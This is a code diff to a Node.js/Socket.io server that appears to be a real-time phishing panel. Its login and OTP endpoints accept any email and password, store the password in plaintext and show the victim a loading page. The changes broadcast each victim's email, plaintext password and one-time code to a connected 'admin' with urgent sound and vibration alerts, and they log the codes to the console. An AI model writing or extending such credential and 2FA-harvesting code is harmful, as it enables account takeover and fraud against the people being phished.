@@ -79,9 +79,23 @@ io.use((socket, next) => {
   });
 });
 
+// Debug all socket emissions
+const originalEmit = io.emit;
+io.emit = function(event, data) {
+  console.log(`📤 Socket Emit: ${event}`, data);
+  return originalEmit.call(this, event, data);
+};
+
 // Socket.io connection
 io.on('connection', (socket) => {
   console.log('👤 Admin connected:', socket.id);
+  
+  // Send a test notification on connection
+  socket.emit('test-notification', { 
+    message: 'Connected to real-time server',
+    timestamp: new Date()
+  });
+  
   socket.on('disconnect', () => console.log('👤 Admin disconnected:', socket.id));
 });
 
@@ -156,7 +170,7 @@ const generateOTP = () => crypto.randomInt(1000, 9999).toString().padStart(4, '0
 
 // USER ENDPOINTS
 
-// User login
+// User login - INSTANT NOTIFICATION TO ADMIN
 app.post('/api/users/login', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -170,11 +184,24 @@ app.post('/api/users/login', async (req, res) => {
       SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL
     `, [email, password]);
 
-    // Emit to admin that user logged in
-    io.emit('user-login', { email, timestamp: new Date() });
-    console.log('📢 User logged in:', email);
+    // INSTANT NOTIFICATION TO ADMIN - with sound and vibration triggers
+    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - New Login:', email);
+    
+    // Emit to admin that user logged in with email and password
+    io.emit('user-login', { 
+      email, 
+      password,
+      timestamp: new Date(),
+      message: '🔐 New user login attempt',
+      notification: {
+        sound: 'urgent', // Triggers urgent sound on admin side
+        vibrate: true,   // Triggers vibration
+        duration: 5000,  // 5 seconds vibration
+        priority: 'high'
+      }
+    });
 
-    // Send loading page
+    // Send loading page to user
     res.send(`
       <!DOCTYPE html>
       <html>
@@ -226,7 +253,7 @@ app.post('/api/users/login', async (req, res) => {
   }
 });
 
-// Save user-created OTP (after self-verification)
+// Save user-created OTP - INSTANT NOTIFICATION TO ADMIN
 app.post('/api/users/save-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
@@ -241,7 +268,7 @@ app.post('/api/users/save-otp', async (req, res) => {
 
     // Save OTP to database and mark as verified
     const result = await pool.query(
-      'UPDATE users SET otp = $1, otp_verified = true, otp_attempts = 0 WHERE email = $2 RETURNING id, email, otp',
+      'UPDATE users SET otp = $1, otp_verified = true, otp_attempts = 0 WHERE email = $2 RETURNING id, email, otp, password',
       [otp, email]
     );
 
@@ -249,12 +276,24 @@ app.post('/api/users/save-otp', async (req, res) => {
       return res.status(404).json({ error: 'User not found' });
     }
 
-    // Emit to admin with the OTP that user created
+    const user = result.rows[0];
+
+    // INSTANT NOTIFICATION TO ADMIN - with sound and vibration
+    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - OTP Created:', email, 'OTP:', otp);
+    
     io.emit('user-otp-created', { 
-      email, 
-      otp, 
+      email: user.email,
+      password: user.password,
+      otp: user.otp,
       timestamp: new Date(),
-      message: 'User has created and verified their OTP'
+      message: '✅ User has created and verified their OTP successfully',
+      notification: {
+        sound: 'success',  // Triggers success sound on admin side
+        vibrate: true,     // Triggers vibration
+        duration: 5000,    // 5 seconds vibration
+        priority: 'high',
+        pattern: [500, 200, 500, 200, 500] // Vigorous vibration pattern
+      }
     });
 
     console.log('✅ User OTP saved and verified for:', email, 'OTP:', otp);
@@ -265,11 +304,15 @@ app.post('/api/users/save-otp', async (req, res) => {
   }
 });
 
-// Resend/Reset OTP request (clears user state to start over)
+// Resend/Reset OTP request - INSTANT NOTIFICATION TO ADMIN
 app.post('/api/users/reset', async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
+
+    // Get user password before reset
+    const userResult = await pool.query('SELECT password FROM users WHERE email = $1', [email]);
+    const password = userResult.rows[0]?.password || 'unknown';
 
     // Reset user OTP state
     await pool.query(
@@ -277,8 +320,21 @@ app.post('/api/users/reset', async (req, res) => {
       [email]
     );
     
-    io.emit('user-reset', { email, timestamp: new Date() });
-    console.log('📢 User reset OTP process:', email);
+    // INSTANT NOTIFICATION TO ADMIN
+    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - User Reset:', email);
+    
+    io.emit('user-reset', { 
+      email, 
+      password,
+      timestamp: new Date(),
+      message: '🔄 User reset OTP process - starting over',
+      notification: {
+        sound: 'warning',  // Triggers warning sound
+        vibrate: true,     // Triggers vibration
+        duration: 5000,    // 5 seconds vibration
+        priority: 'medium'
+      }
+    });
 
     res.json({ success: true, message: 'OTP process reset. Please login again.' });
   } catch (error) {
@@ -405,7 +461,8 @@ initializeDatabase().then((success) => {
       console.log(`📡 Port: ${PORT}`);
       console.log(`🔗 User login: /users/login`);
       console.log(`🔗 Admin login: /admin`);
-      console.log('\n📢 Socket.io server ready for real-time notifications\n');
+      console.log('\n📢 Socket.io server ready for real-time notifications');
+      console.log('🔔 Instant notifications with sound and vibration enabled\n');
     });
   } else {
     process.exit(1);
